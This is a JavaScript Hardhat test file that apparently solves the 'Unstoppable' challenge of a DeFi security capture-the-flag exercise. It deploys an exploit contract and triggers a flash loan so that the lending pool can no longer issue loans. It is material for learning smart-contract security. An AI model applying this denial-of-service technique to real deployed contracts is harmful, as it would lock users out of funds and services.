const { ethers } = require("hardhat")
const { expect } = require("chai")

describe("[Challenge] Unstoppable", function () {
    let deployer, attacker, someUser

    // Pool has 1M * 10**18 tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther("1000000")
    const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther("100")

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        ;[deployer, attacker, someUser] = await ethers.getSigners()

        const DamnValuableTokenFactory = await ethers.getContractFactory(
            "DamnValuableToken",
            deployer
        )
        const UnstoppableLenderFactory = await ethers.getContractFactory(
            "UnstoppableLender",
            deployer
        )

        this.token = await DamnValuableTokenFactory.deploy()
        this.pool = await UnstoppableLenderFactory.deploy(this.token.address)

        await this.token.approve(this.pool.address, TOKENS_IN_POOL)
        await this.pool.depositTokens(TOKENS_IN_POOL)

        await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE)

        expect(await this.token.balanceOf(this.pool.address)).to.equal(TOKENS_IN_POOL)

        expect(await this.token.balanceOf(attacker.address)).to.equal(
            INITIAL_ATTACKER_TOKEN_BALANCE
        )

        // Show it's possible for someUser to take out a flash loan
        const ReceiverContractFactory = await ethers.getContractFactory(
            "ReceiverUnstoppable",
            someUser
        )
        this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address)
        await this.receiverContract.executeFlashLoan(10)
    })

    it("Exploit", async function () {
        /** CODE YOUR EXPLOIT HERE */

        console.log("\t Deployer's Address:", deployer.address)
        console.log("\t Attacker's Address:", attacker.address)

        const DamnValuableTokenFactory = await ethers.getContractFactory(
            "DamnValuableToken",
            attacker
        )

        let token = DamnValuableTokenFactory.attach(this.token.address)

        const UnstoppableLenderFactory = await ethers.getContractFactory(
            "UnstoppableLender",
            attacker
        )
        let pool = UnstoppableLenderFactory.attach(this.pool.address)

        console.log("\t DamnValuableToken Address (Deployer):", this.token.address)
        console.log("\t UnstoppableLender Address (Deployer):", this.pool.address)
        console.log("\t Token - DamnValuableToken Address (attacker):", token.address)
        console.log("\t Pool - UnstoppableLender Address (attacker):", pool.address)

        console.log(
            "\t Pool's DVT Token Balance:",
            (await token.balanceOf(pool.address)).toString()
        )

        console.log(
            "\t Attacker's DVT Token Balance:",
            (await token.balanceOf(attacker.address)).toString()
        )

        const ReceiverContractFactory = await ethers.getContractFactory(
            "ReceiverUnstoppable",
            attacker
        )
        let receiver = ReceiverContractFactory.attach(this.receiverContract.address)

        console.log(
            "\t receiver's DVT Token Balance:",
            (await token.balanceOf(receiver.address)).toString()
        )

        const ExploitFactory = await ethers.getContractFactory("Exploit", attacker)
        let ExploitContract = await ExploitFactory.deploy(
            receiver.address,
            pool.address,
            token.address
        )

        await token.transfer(ExploitContract.address, INITIAL_ATTACKER_TOKEN_BALANCE)

        await ExploitContract.CallFlashLoan()

        console.log(
            "\t token.balanceOf(pool.address):",
            (await token.balanceOf(pool.address)).toString()
        )
        console.log("\t pool.poolBalance():", (await pool.poolBalance()).toString())
    })

    after(async function () {
        /** SUCCESS CONDITIONS */

        // It is no longer possible to execute flash loans
        await expect(this.receiverContract.executeFlashLoan(10)).to.be.reverted
    })
})
